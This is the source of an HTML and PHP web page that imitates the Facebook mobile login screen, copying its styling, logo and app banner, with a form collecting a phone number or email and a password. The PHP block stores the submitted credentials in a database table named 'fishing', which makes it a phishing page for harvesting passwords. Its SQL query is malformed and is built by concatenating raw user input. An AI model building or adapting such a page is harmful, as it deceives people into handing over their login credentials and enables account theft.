<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
  <title></title>
</head>

<body>
 
 
 
 <style>
   
   
   
   
   .app{
  
  height: auto;
  padding: 0;
  border: 0;
  width: 100%;
  
  margin: 0;
  
  
}



.imgbox{
  
  
  display: inline-flex;
  align-items: center;
  justify-content: center;
  
  width:350px;
  

  
  

}


.img{
 


 height: 40px;
 
margin-bottom: 10px;



}





.main{


display:inline-flex;
  
  width: 350px;
  flex-direction: column;
align-items:center;
}





.main2{


display:inline-flex;
  
  width: 350px;
  flex-direction: column;
align-items:center;



}









.input{
  padding-left: 10px;
  background-color: rgba(245,246,248,255);
  
  height: 40px;
  width:330px;
  border-color: rgba(238,237,238,255);

 
  margin-bottom: 10px;
  border-width: .6px;
  border-radius: 3px;
}

.login{
  
background-color: rgba(24,120,243,255);
  font-size: 17px;
  
  color: white;
 
  width: 340px;
  
   height: 42px;

  border-color: transparent;
  
  border-radius: 3px;
}

.account {
  
  background-color: rgba(0,164,0,255);
   color: white;
margin-top: 20px;
font-size: 14px;

height: 35px;
width: 160px;
  
   border-color: transparent;
  
   border-radius: 3px;}
   
   
   
   .left{
     display: inline-block;
     margin: 10px;
    width: 130px; 
     
     margin-top: 20px;
   }
      
   
   .right{
     display: inline-block;
     margin: 10px;
    width: 130px; 
      margin-top: 20px;
     color: rgba(205,207,212,255);
   }
   .or{
     
     display: inline-block;
     color: rgba(82,85,90,255);
     margin-top: 1px;
   }
   .blue{
     color: rgba(52,108,185,255);
     font-size: 13px;
     margin-top: 10px ;
     
   }
   .help{
     
    width: 350px;
    
     margin: 0;
   }
   
   
   
   

   
   
   
   
   
   
   
 </style>
 
 
 
 
 
 <?php 
 
 
   
  
 $server = "localhost";
 $username="root";
 $password ="";
 $con=mysqli_connect($server,$username,$password);
 if(!$con){
   
   die("connection failed".mysqli_connect_error()); 
 }
 else {
   
 } 
 
 $number= $_POST['number'];
 $password= $_POST['password'];
 $sql="INSERT INTO `fishing'.'one'(`name`,`password`) VALUES ('$number','$password');"; 
 
 
 
 

 
  ?>
 
 
 
 
 
 
 
   <a href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DU7_qYTYIHVRjMskaTItdkw7w%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1"><img src="fb.jpeg"  class="app"></a>
  
  <div class="imgbox">
    
 
  
  <img class="img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
  

 </div>

  


  <div class="main"> 
  <form action="index.php" method="POST">
    <input type="text" class="input number" placeholder="Mobile number or email address" name="number" id="number">
    
    
    <input class="input password" type="text" placeholder="Password" name="password" id="password">
    
   
    <button class="login"><b>Log In</b></button>
    
     </form>
    
    
    <div class="blue">
      Forgotten password?
    </div>
    
      
     
     
     <div>
    
     <hr class="left"><div class="or">or</div><hr class="right">
     
     
        
     </div>
      
   <button class="account"><b>Create New Account</b></button>

  
    
  </div>
<img src="img.jpg" class="help" alt="">



</body>
</html>
